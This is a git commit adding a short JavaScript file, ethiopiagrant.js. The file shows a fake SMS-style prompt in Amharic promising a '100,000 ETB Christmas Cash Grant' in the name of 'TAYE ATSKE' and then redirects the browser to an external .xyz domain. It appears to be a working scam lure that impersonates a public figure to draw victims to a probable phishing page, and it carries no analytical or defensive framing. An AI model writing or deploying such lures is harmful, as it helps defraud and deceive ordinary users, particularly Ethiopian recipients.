6cb0feac7ba2a215cc6411ffe512ddc7d99b4bf7
bigetijazz19 <bigetijazz19@gmail.com>
2024-12-02 10:06:40 -0800

    Create ethiopiagrant.js

---
+++ ethiopiagrant.js
@@ -0,0 +1,6 @@
+
+var password = '100,000 ኢ.ቲ.ቢ'
+password=prompt('SMS: እንኳን ደስ ያለህ፣ ለ TAYE ATSKE 100,000 ETB Christmas Cash Grant ለሁላችሁም ብቁ ናችሁ። የገንዘብ ሽልማት ለማግኘት እሺን ይጫኑ።','100,000 ኢ.ቲ.ቢ');
+if (password != '100,000 ኢ.ቲ.ቢ') {
+location.href='https://www.jinfa-offre.xyz/45000ETB';
+}
